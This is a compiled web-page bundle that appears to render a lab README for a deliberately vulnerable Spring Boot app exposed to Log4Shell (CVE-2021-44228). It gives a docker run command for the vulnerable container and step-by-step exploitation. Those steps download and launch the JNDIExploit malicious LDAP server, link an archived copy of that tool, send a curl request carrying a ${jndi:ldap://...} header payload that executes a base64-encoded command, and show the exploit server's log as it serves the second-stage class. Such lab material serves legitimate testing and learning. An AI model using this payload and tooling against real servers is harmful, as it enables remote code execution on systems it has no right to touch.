import{_ as i}from"./plugin-vue_export-helper-x3n3nnut.js";import{r,o,c as l,a,b as e,d as s,e as t}from"./app-YbIewe1q.js";const c="/DailyNotes/assets/screenshot-BDVPJIvV.png",d={},p=a("h1",{id:"log4shell-sample-vulnerable-application-cve-2021-44228",tabindex:"-1"},[a("a",{class:"header-anchor",href:"#log4shell-sample-vulnerable-application-cve-2021-44228","aria-hidden":"true"},"#"),e(" Log4Shell sample vulnerable application (CVE-2021-44228)")],-1),u={href:"https://www.lunasec.io/docs/blog/log4j-zero-day/",target:"_blank",rel:"noopener noreferrer"},h=t('<p>It uses Log4j 2.14.1 (through <code>spring-boot-starter-log4j2</code> 2.6.1) and the JDK 1.8.0_181.</p><figure><img src="'+c+`" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="running-the-application" tabindex="-1"><a class="header-anchor" href="#running-the-application" aria-hidden="true">#</a> Running the application</h2><p>Run it:</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">docker</span> run <span class="token parameter variable">--name</span> vulnerable-app <span class="token parameter variable">--rm</span> <span class="token parameter variable">-p</span> <span class="token number">8080</span>:8080 ghcr.io/christophetd/log4shell-vulnerable-app@sha256:6f88430688108e512f7405ac3c73d47f5c370780b94182854ea2cddc6bd59929
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="exploitation-steps" tabindex="-1"><a class="header-anchor" href="#exploitation-steps" aria-hidden="true">#</a> Exploitation steps</h2>`,6),m={href:"https://www.lunasec.io/docs/blog/log4j-zero-day/",target:"_blank",rel:"noopener noreferrer"},v=a("strong",null,"Run at your own risk, preferably in a VM in a sandbox environment",-1),b=a("strong",null,"Update (Dec 13th)",-1),g={href:"https://twitter.com/_mph4/status/1470343429599211528",target:"_blank",rel:"noopener noreferrer"},f={href:"http://web.archive.org/web/20211211031401/https://objects.githubusercontent.com/github-production-release-asset-2e65be/314785055/a6f05000-9563-11eb-9a61-aa85eca37c76?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20211211%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20211211T031401Z&X-Amz-Expires=300&X-Amz-Signature=140e57e1827c6f42275aa5cb706fdff6dc6a02f69ef41e73769ea749db582ce0&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=314785055&response-content-disposition=attachment%3B%20filename%3DJNDIExploit.v1.2.zip&response-content-type=application%2Foctet-stream",target:"_blank",rel:"noopener noreferrer"},_={href:"https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2",target:"_blank",rel:"noopener noreferrer"},x=t(`<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">wget</span> https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
<span class="token function">unzip</span> JNDIExploit.v1.2.zip
<span class="token function">java</span> <span class="token parameter variable">-jar</span> JNDIExploit-1.2-SNAPSHOT.jar <span class="token parameter variable">-i</span> your-private-ip <span class="token parameter variable">-p</span> <span class="token number">8888</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>Then, trigger the exploit using:</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment"># will execute &#39;touch /tmp/pwned&#39;</span>
<span class="token function">curl</span> <span class="token number">127.0</span>.0.1:8080 <span class="token parameter variable">-H</span> <span class="token string">&#39;X-Api-Version: \${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}&#39;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>Notice the output of JNDIExploit, showing it has sent a malicious LDAP response and served the second-stage payload:</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>[+] LDAP Server Start Listening on 1389...
[+] HTTP Server Start Listening on 8888...
[+] Received LDAP Query: Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo
[+] Paylaod: command
[+] Command: touch /tmp/pwned

[+] Sending LDAP ResourceRef result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo with basic remote reference payload
[+] Send LDAP reference result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo redirecting to http://192.168.1.143:8888/Exploitjkk87OnvOH.class
[+] New HTTP Request From /192.168.1.143:50119  /Exploitjkk87OnvOH.class
[+] Receive ClassRequest: Exploitjkk87OnvOH.class
[+] Response Code: 200
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>To confirm that the code execution was successful, notice that the file <code>/tmp/pwned.txt</code> was created in the container running the vulnerable application:</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$ docker exec vulnerable-app ls /tmp
...
pwned
...
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="reference" tabindex="-1"><a class="header-anchor" href="#reference" aria-hidden="true">#</a> Reference</h2><p>https://www.lunasec.io/docs/blog/log4j-zero-day/ https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/</p><h2 id="contributors" tabindex="-1"><a class="header-anchor" href="#contributors" aria-hidden="true">#</a> Contributors</h2>`,10),k={href:"https://twitter.com/christophetd",target:"_blank",rel:"noopener noreferrer"},w={href:"https://twitter.com/rayhan0x01",target:"_blank",rel:"noopener noreferrer"};function A(y,D){const n=r("ExternalLinkIcon");return o(),l("div",null,[p,a("p",null,[e("This repository contains a Spring Boot web application vulnerable to CVE-2021-44228, nicknamed "),a("a",u,[e("Log4Shell"),s(n)]),e(".")]),h,a("p",null,[a("em",null,[e("Note: This is highly inspired from the original "),a("a",m,[e("LunaSec advisory"),s(n)]),e(". "),v,e(".")])]),a("p",null,[b,e(": "),a("em",null,[e("The JNDIExploit repository has been removed from GitHub (presumably, "),a("a",g,[e("not by GitHub"),s(n)]),e(")... "),a("a",f,[e("Click Here"),s(n)]),e(" to Download the version cached by the Wayback Machine.")])]),a("ul",null,[a("li",null,[e("Use "),a("a",_,[e("JNDIExploit"),s(n)]),e(" to spin up a malicious LDAP server")])]),x,a("p",null,[a("a",k,[e("@christophetd"),s(n)]),a("a",w,[e("@rayhan0x01"),s(n)])])])}const S=i(d,[["render",A],["__file","index.html.vue"]]);export{S as default};
